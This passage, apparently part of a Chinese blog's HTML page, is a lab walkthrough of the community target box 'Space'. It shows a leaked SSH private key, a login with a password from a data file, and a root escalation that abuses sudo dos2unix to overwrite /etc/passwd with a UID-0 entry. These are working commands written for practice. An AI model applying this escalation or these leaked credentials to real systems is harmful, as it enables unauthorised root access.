du7tgwsoFcOctatKz93wrBGQwlCcXH45/T2cOSEc6iXDtQTyBWnD6b7/4^M$<br>1iNQwNbJndPsa/wFFhAS+PPdhmeoTEeLjS5b2toj6E7OHH2bYXnF1ndCJgslnEnukuaRTV^M$<br>mfgv7u03e5eOsYZTek8Pzdp9b0K7qQAAAAMBAAEAAAGADZsS3Fp8zodP6A2Nv6X3Mr/rei^M$<br>gsQJ/DoM+vQkVnTJSn587tAe+LZtwcv/4BIxj2C/oSe3u2hs/MtQ8kMemR0A1/tPiauEL5^M$<br>X+go8lxfj6F5YfUHC6vvcEXI42OgTJ7Z6C6aJPcD346DEI2K1meoAJpoMgIzQdUfkvDPxt^M$<br>ShFo/5uVVtIOcM2bkgMdnbSfX5uNZ4aR2OEIXJOPT+QVlk55hH183CeiAyoYjI1pdg0Nbw^M$<br>c51j0a+ULvvUOdQkSfDNUXD2G7I6UxIYCWOkh2uq0ddPU+Kwe7d12+cnvpub1BEtKAfCTG^M$<br>+NSL8y76bO2u/I7f/kPRzV7Hm4po0X5tZc0fn1tctqV2M+Hu+JoCrs/yVwo0CuA29h/pHh^M$<br>cg1cBzn7jISuDMIAU5l8/nzs4/q/AIfQzqywYUrt04dkcTBmoPyI1QZiD6LufA8L8ZYqQB^M$<br>TrzFsiw/DZNIUBW0XKECr3OQWiaTz44g1YWxKCpFjbXOcR+E25BNAL8eTl3D63OIIBAAAA^M$<br>wCszq5giZqnTab2lVPvtEDePkQHRBZzShp0xm5Ru5kCyzoCrkbyrHH0GhoH77RIItrwd/3^M$<br>XHXtzSAXsWWWiTIkO4zl9xV0dTs85mqeLCSQtS4yG8rz1vMsPCRPysKAo0pXMgvvKHqehl^M$<br>yIU99M3jVPbBiwIuXFGohWr4agxrqMOcsuNIPx3PFmO3lqo08blC+GUBerk8+fiIhkJWe0^M$<br>izzECGHV9xcCoOiwiAdQjr2hNzw9QfnpO/w9uWKmb1397aoQAAAMEA9D47nMj7KvxQtcWz^M$<br>XMXnbqE1Z9EDavrAoA1zZSLrGzJs7jWZyWJuKv450wuf2fqrMCMA0BVngNnS3ljXj04pAg^M$<br>EU5sFE8WOlVNvC9iSd1x5Nmo7DMItdKSHeJop63flzvi+7aNg9VX+qWS4oWMuMZ0m7Vupf^M$<br>mC+xiO+dng7BBFWKIYqrcdWCuBqA6TdOt/qycejhZpTzXzYs/KsmMBjl7uSuUQZu2f6GDl^M$<br>KvCxTjcpE8v7FgSPJv4TNg/DjbEneZAAAAwQDyoLp4Rapn6iXTKFqOAL/8m+uH8dqgB5OD^M$<br>560gxDEgINdYzxwfOz+p3gphSp54MczEJEnYnfvDfKYKR5ty0AXS0iEjEoGAQFXuRjWEQf^M$<br>MeTEb+VqnK/Y5sNXWwW/FVr2tTibwA0QlzQEtOOAceh5HcKrtKpxZjkK2d4odvY6MmbL/J^M$<br>Rtgh4TMV09EokfXACR9F/bNY5Lu+xFMef4NWtXl3e0GEZcoLDSsKCuloOJJoJR/IM1w8gs^M$<br>Bl1Hds+8Z7rpEAAAAMYW5kZWxpQFNwYWNlAQIDBAUGBw==^M$<br>-----END OPENSSH PRIVATE KEY-----^M$<br></code></pre></td></tr></table></figure>
+每一行后面都有换行符，破坏了密钥结构<br><code>如果是使用复制粘贴，而非wget下载，就不会存在上述的问题</code></li>
+</ul>
+<p>使用命令转换文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# dos2unix andeli.id_rsa            <br>dos2unix: 正在转换文件 andeli.id_rsa 为Unix格式...<br></code></pre></td></tr></table></figure>
+<p>转换后还存在问题，直接复制粘贴秘钥</p>
+<h2 id="3、重新进行ssh登录"><a href="#3、重新进行ssh登录" class="headerlink" title="3、重新进行ssh登录"></a>3、重新进行ssh登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh andeli@192.168.2.38 -i <span class="hljs-built_in">id</span>           <br>Linux Space 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>andeli@Space:~$ <br></code></pre></td></tr></table></figure>
+
+<p><strong>USER FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-cea97ada-4f00-11f0-af69-57bd20d8ec7c&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用<code>sudo -l</code>进行查看，发现需要密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ <span class="hljs-built_in">sudo</span> -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> andeli: <br></code></pre></td></tr></table></figure>
+
+<h2 id="1、切换到另外一个用户"><a href="#1、切换到另外一个用户" class="headerlink" title="1、切换到另外一个用户"></a>1、切换到另外一个用户</h2><p>查看用户的<code>home</code>目录，发现存在一个<code>user_data.json</code>文件<br>查看发现是一些用户名和密码，同时观察到有一串密码是有颜色的<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506241726083.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看<code>passwd</code>文件，发现存在一个<code>a3170</code>用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>andeli:x:1000:1000:,,,:/home/andeli:/bin/bash<br>a3170:x:1001:1001:,,,:/home/a3170:/bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>尝试使用用户<code>a3170</code>和密码<code>31703170317031703170</code>进行登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@Space:~$ ssh a3170@127.0.0.1<br>The authenticity of host <span class="hljs-string">&#x27;127.0.0.1 (127.0.0.1)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>127.0.0.1<span class="hljs-string">&#x27; (ECDSA) to the list of known hosts.</span><br><span class="hljs-string">a3170@127.0.0.1&#x27;</span>s password: <br>Linux Space 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>a3170@Space:~$ <br></code></pre></td></tr></table></figure>
+
+<h2 id="2、dos2unix提权"><a href="#2、dos2unix提权" class="headerlink" title="2、dos2unix提权"></a>2、dos2unix提权</h2><p>使用<code>sudo -l</code>查看，发现<code>dos2unix</code>不需要密码也可执行<code>root</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> a3170 on Space:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User a3170 may run the following commands on Space:<br>    (ALL) NOPASSWD: /usr/bin/dos2unix<br></code></pre></td></tr></table></figure>
+
+<p>查看<code>dos2unix</code>的使用方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ /usr/bin/dos2unix -h<br>Usage: dos2unix [options] [file ...] [-n infile outfile ...]<br> --allow-chown         allow file ownership change<br> -ascii                convert only line breaks (default)<br> -iso                  conversion between DOS and ISO-8859-1 character <span class="hljs-built_in">set</span><br>   -1252               use Windows code page 1252 (Western European)<br>   -437                use DOS code page 437 (US) (default)<br>   -850                use DOS code page 850 (Western European)<br>   -860                use DOS code page 860 (Portuguese)<br>   -863                use DOS code page 863 (French Canadian)<br>   -865                use DOS code page 865 (Nordic)<br> -7                    convert 8 bit characters to 7 bit space<br> -b, --keep-bom        keep Byte Order Mark<br> -c, --convmode        conversion mode<br>   convmode            ascii, 7bit, iso, mac, default to ascii<br> -f, --force           force conversion of binary files<br> -h, --<span class="hljs-built_in">help</span>            display this <span class="hljs-built_in">help</span> text<br> -i, --info[=FLAGS]    display file information<br>   file ...            files to analyze<br> -k, --keepdate        keep output file <span class="hljs-built_in">date</span><br> -L, --license         display software license<br> -l, --newline         add additional newline<br> -m, --add-bom         add Byte Order Mark (default UTF-8)<br> -n, --newfile         write to new file<br>   infile              original file <span class="hljs-keyword">in</span> new-file mode<br>   outfile             output file <span class="hljs-keyword">in</span> new-file mode<br> --no-allow-chown      don<span class="hljs-string">&#x27;t allow file ownership change (default)</span><br><span class="hljs-string"> -o, --oldfile         write to old file (default)</span><br><span class="hljs-string">   file ...            files to convert in old-file mode</span><br><span class="hljs-string"> -q, --quiet           quiet mode, suppress all warnings</span><br><span class="hljs-string"> -r, --remove-bom      remove Byte Order Mark (default)</span><br><span class="hljs-string"> -s, --safe            skip binary files (default)</span><br><span class="hljs-string"> -u,  --keep-utf16     keep UTF-16 encoding</span><br><span class="hljs-string"> -ul, --assume-utf16le assume that the input format is UTF-16LE</span><br><span class="hljs-string"> -ub, --assume-utf16be assume that the input format is UTF-16BE</span><br><span class="hljs-string"> -v,  --verbose        verbose operation</span><br><span class="hljs-string"> -F, --follow-symlink  follow symbolic links and convert the targets</span><br><span class="hljs-string"> -R, --replace-symlink replace symbolic links with converted files</span><br><span class="hljs-string">                         (original target files remain unchanged)</span><br><span class="hljs-string"> -S, --skip-symlink    keep symbolic links and targets unchanged (default)</span><br><span class="hljs-string"> -V, --version         display version number</span><br></code></pre></td></tr></table></figure>
+<p>发现参数<code>-n</code>可以写入文件</p>
+<p>尝试修改用户<code>a3170</code>的<code>UID</code>和<code>GID</code>和<code>root</code>一样，然后覆盖<code>/etc/passwd</code>文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ <span class="hljs-built_in">cat</span> /etc/passwd &gt; /tmp/passwd<br>a3170@Space:~$ vi /tmp/passwd<br>a3170@Space:~$ <span class="hljs-built_in">sudo</span> /usr/bin/dos2unix -n /tmp/passwd  /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>andeli:x:1000:1000:,,,:/home/andeli:/bin/bash<br>a3170:x:0:0:,,,:/home/a3170:/bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>重新登录用户<code>a3170</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ su a3170<br>Password: <br>root@Space:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+
+<p><strong>ROOT FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Space:~# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-f9f8c2ea-4f00-11f0-9724-e7b0f6215b99&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/" class="category-chain-item">群友靶机</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ssh%E7%A7%81%E9%92%A5CRLF/" class="print-no-link">#ssh私钥CRLF</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83-dos2unix/" class="print-no-link">#提权-dos2unix</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Space</div>
+      <div>http://miao-sec.github.io/群友靶机/Space/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/hackmyvm/BaseMe/" title="BaseMe">
+                        <span class="hidden-mobile">BaseMe</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
